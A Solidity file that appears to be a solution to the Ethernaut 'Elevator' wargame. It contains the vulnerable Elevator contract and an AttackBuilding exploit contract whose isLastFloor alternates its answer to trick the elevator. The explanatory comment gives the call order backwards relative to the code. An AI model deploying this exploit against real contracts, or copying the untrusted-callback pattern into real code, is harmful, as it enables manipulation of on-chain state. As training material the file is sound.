// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

// We have a building and an elevator. The relation between them is that the building has an elevator. As long as we don't have more
// specific logic regarding ownership, we can implement our own building logic and as so we can manipulate the "isLastFloor" function
// We want first time that has been called to receive true and the second time to receive false.
contract Elevator {
    bool public top = true;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract AttackBuilding is Building {
    Elevator public elevator;
    bool private lastFloor = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint _floor) external override returns (bool) {
        bool result = lastFloor;
        lastFloor = !lastFloor;
        return result;
    }

    function goTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}
